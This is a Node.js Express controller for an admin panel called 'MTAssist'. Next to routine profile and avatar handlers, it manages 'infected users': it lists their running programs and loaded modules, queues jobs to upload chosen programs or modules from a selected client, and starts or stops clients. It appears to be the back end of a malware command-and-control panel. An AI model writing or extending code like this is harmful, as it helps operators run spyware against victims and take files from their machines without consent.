let View = require('../views/base');
let path = require('path');
let fs = require('fs');
let crypto = require('crypto');
let moment = require('moment');

let BaseController = require('./BaseController');
let InfectedUserModel = require('../models/InfectedUserModel');
let ProgramModel = require('../models/ProgramModel');
let UploadModel = require('../models/UploadModel');
let UserModel = require('../models/UserModel');
let Helper = require('../util/helper');

module.exports = BaseController.extend({
    name: 'UserController',

    account_settings: async function (req, res, next) {
        let user = await UserModel.findOne({id: req.session.user.id});
        let v = new View(res, 'settings/account_settings');
        v.render({
            title: 'MTAssist|Profile',
            session: req.session,
            i18n: res,
            tab_text: 'settings',
            sub_text: 'settings_profile',
            user: user,
        })
    },

    editProfile: async function (req, res, next) {
        let username = req.body.username, email = req.body.email,
            old_password = req.body.old_password, new_password = req.body.new_password;
        let user = await UserModel.findOne({id: req.session.user.id});
        if (user.email !== email) return res.send({status: 'error', message: res.cookie().__('Undefined user')});
        if (!user.verifyPassword(old_password)) return res.send({
            status: 'error',
            message: res.cookie().__('Old password is not correct')
        });
        user.username = username;
        user.password = new_password;
        await user.save();
        req.session.user = user;
        return res.send({status: 'success', message: res.cookie().__('Updated user profile successfully')});
    },

    changeAvatar: async function (req, res, next) {
        let user = await UserModel.findOne({id: req.session.user.id});
        let avatarPath = user.avatar;
        if (req.body.avatarImg.length > 1000) {
            let avatarData = req.body.avatarImg.replace(/^data:image\/\w+;base64,/, "");
            let file_extension = '.png';
            if (avatarData.charAt(0) === '/') file_extension = '.jpg';
            else if (avatarData.charAt(0) === 'R') file_extension = '.gif';
            let public_path = path.resolve('public');
            avatarPath = '/avatars/avatar_' + user.id + file_extension;
            let avatarUploadPath = path.resolve('public') + avatarPath;
            fs.writeFileSync(avatarUploadPath, avatarData, 'base64');
        }
        await user.updateOne({avatar: avatarPath});
        req.session.user.avatar = avatarPath;
        return res.send({
            status: 'success',
            message: res.cookie().__('Changed avatar successfully'),
            avatarPath: avatarPath
        });
    },
    error: function (req, res, next) {
        let v = new View(res, 'partials/error');
        v.render({
            title: 'MTAssist|Error',
            session: req.session,
            i18n: res,
        })
    },

    uploadManagement: async function (req, res, next) {
        let user = req.session.user;
        let uploads = await UploadModel.find().sort({ updatedAt: -1 });
        let uploads_data = [];

        uploads.forEach(function(upload) {
            uploads_data.push({
                id: upload.id,
                username: upload.username,
                module_name: upload.module_name,
                module_path: upload.module_path,
                upload_type: upload.upload_type,
                status: upload.status,
                startedAt: moment(upload.createdAt).format('MMMM DD YYYY, HH:mm:ss.SSS'),
                endAt: moment(upload.updatedAt).format('MMMM DD YYYY, HH:mm:ss.SSS'),
            });
        });

        let v = new View(res, 'admin_vs/upload_manage');
        v.render({
            title: 'MTAssist|Upload Management',
            session: req.session,
            i18n: res,
            tab_text: 'admin_upload_management',
            sub_text: '',
            user: user,
            uploads: uploads_data,
        })
    },

    uploadDelete: async function (req, res, next) {
        try {
            let upload_id = req.body.id;
            let upload_record = await UploadModel.findOne({ id: upload_id });
            if (!upload_record) {
                return res.send({ status: 'failed', message: res.cookie().__('Undefined upload record') });
            }
            await UploadModel.deleteMany({ id: upload_id });
            return res.send({ status: 'success', message: res.cookie().__('Delete upload record successfully') });
        } catch (err) {
            console.log(err);
            return res.send({ status: 'failed', message: res.cookie().__('Delete upload record failed') });
        }
    },

    uploadProgram: async function (req, res, next) {
        try {
            let module_id = req.body.module_id;
            let upload_type = req.body.upload_type;
            let module_index = Number(req.body.module_index);

            let program_record = await ProgramModel.findOne({ id: module_id });
            if (program_record) {
                let user_id = program_record.user_id;
                let username = program_record.username;
                let module_name = '', module_path = '', dependencies = '';
                if (upload_type === 'all') {
                    module_name = program_record.process_name;
                    module_path = program_record.program_path;
                    dependencies = program_record.modules;
                } else if (upload_type === 'one') {
                    let modules = JSON.parse(program_record.modules);
                    module_name = modules[module_index].mn;
                    module_path = modules[module_index].mp;
                }

                let upload_record = new UploadModel({
                    user_id, username, module_name, module_path, dependencies, upload_type
                });
                await upload_record.save();

                return res.send({
                    status: 'success',
                    message: 'Upload information saved'
                });
            } else {
                return res.send({
                    status: 'failed',
                    message: 'Program not exist'
                });
            }
        } catch (err) {
            console.log(err);
            return res.send({
                status: 'failed',
                message: 'Upload information not saved. Please try again'
            });
        }
    },

    programManagement: async function (req, res, next) {
        let user = req.session.user;
        let page_index = Number(req.query.page_index);
        if (!page_index) {
            page_index = 1;
        }
        let page_size = Number(req.query.page_size);
        if (!page_size) {
            page_size = 10;
        }
        let sel_user_id = req.query.sel_user_id;

        let users = await InfectedUserModel.find({ status: 0 }).sort({ username: 1 });
        if (!sel_user_id && users.length > 0) {
            sel_user_id = users[0].id;
        }

        let programs = await ProgramModel.find({ user_id: sel_user_id }).sort({ process_name: 1 });
        let programs_data = [];

        let page_count = Math.ceil(programs.length / page_size);
        let pagination_enabled = true;
        let page_indices = [];

        if (page_count > 0) {
            if (page_count < page_index) {
                page_index = page_count;
            }
            let start_index = (page_index - 1) * page_size;
            let end_index = Math.min(page_index * page_size, programs.length);
            programs = programs.slice(start_index, end_index);

            start_index = Math.floor((page_index - 1) / 5) * 5 + 1;
            end_index = Math.min(Math.ceil(page_index / 5) * 5, page_count);
            for (let i = start_index; i <= end_index; i++) {
                page_indices.push(i);
            }

            programs.forEach(function(program) {
                let program_data = {
                    id: program.id,
                    process_name: program.process_name,
                    program_path: program.program_path,
                    executedAt: moment(program.executedAt).format('MMMM DD YYYY, HH:mm:ss.SSS'),
                    modules: []
                };

                let modules = JSON.parse(program.modules);
                modules.forEach(function(module) {
                    program_data.modules.push({
                        module_name: module.mn,
                        module_path: module.mp
                    });
                });
                programs_data.push(program_data);
            });
        } else {
            pagination_enabled = false;
        }

        let v = new View(res, 'admin_vs/program_manage');
        v.render({
            title: 'MTAssist|Program Management',
            tab_text: 'admin_program_management',
            session: req.session,
            i18n: res,
            sub_text: '',
            user: user,
            users: users,
            programs: programs_data,
            sel_user_id: sel_user_id,
            pagination_enabled: pagination_enabled,
            page_index: page_index,
            page_size: page_size,
            page_count: page_count,
            page_indices: page_indices
        })
    },

    clientManagement: async function (req, res, next) {
        let user = req.session.user;
        let infectedUsers = await InfectedUserModel.find({});
        for (let i in infectedUsers) {
            infectedUsers[i].formattedCreatedAt = moment(infectedUsers[i].createdAt).format('MMMM DD YYYY, HH:mm:ss.SSS');
            infectedUsers[i].formattedUpdatedAt = moment(infectedUsers[i].updatedAt).format('MMMM DD YYYY, HH:mm:ss.SSS');
        }

        let v = new View(res, 'admin_vs/client_manage');
        v.render({
            title: 'MTAssist|Client Management',
            session: req.session,
            i18n: res,
            tab_text: 'admin_client_management',
            sub_text: '',
            user: user,
            users: infectedUsers,
        })
    },

    editClient: async function (req, res, next) {
        let type = req.body.type;

        if (type === "edit") {
            let id = req.body.id;
            let username = req.body.username;
            let user = await InfectedUserModel.findOne({ id: id });
            if (!user) {
                return res.send({ status: 'error', message: res.cookie().__('Undefined Client') });
            }
            await user.updateOne({ username });
            return res.send({ status: 'success', message: res.cookie().__('Updated user profile successfully') });
        } else if (type === "start" || type === "stop") {
            let id = req.body.id;
            let user = await InfectedUserModel.findOne({ id: id });
            if (!user) {
                return res.send({ status: 'error', message: res.cookie().__('Undefined user') });
            }
            await user.updateOne({ status: type === 'start' ? 0 : 1 });
            return res.send({ status: 'success', message: res.cookie().__('Updated successfully') });
        }
    },
});
